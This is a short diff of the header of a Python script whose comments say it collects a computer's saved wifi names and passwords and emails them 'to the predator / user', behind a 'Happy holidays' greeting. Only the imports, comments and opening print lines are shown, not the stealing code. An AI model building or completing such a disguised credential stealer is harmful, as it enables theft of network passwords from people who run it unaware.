@@ -1,21 +1,15 @@
-#! py
-#########################
-# Copyright of astranot #
-# github.com/astranot   #
-# fikrichuck@gmail.com  #
-# twitter/fiekzzlala    #
-#########################
-import subprocess
-import smtplib
-from email.message import EmailMessage
-import numpy as np
-
 # This python script is solely for educational purpose only
 # Everything is under the user's responsibility
 # Written at 17/11/2021
 # Script:
 # create a list of wifi names and passwords
 # email the list to the predator / user
+# copyright of fiekzz
+
+import subprocess
+import smtplib
+from email.message import EmailMessage
+import numpy as np
 
 print("Happy holidays guys! Wish you all the best!\n")
 print("Please wait this might take a while")
